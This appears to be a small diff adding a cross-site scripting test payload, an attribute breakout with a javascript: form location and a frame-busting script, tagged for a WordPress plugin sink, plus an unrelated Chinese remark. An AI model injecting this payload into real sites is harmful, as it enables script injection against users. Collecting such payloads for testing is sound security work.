@@ -1,0 +1,3 @@
+payload:'><form name=self location="javascript:alert(1)"></form><script>if(top!=self){top.location=self.location}</script>
+sink:wordpress-plugin
+别闹了 这是 马赛克
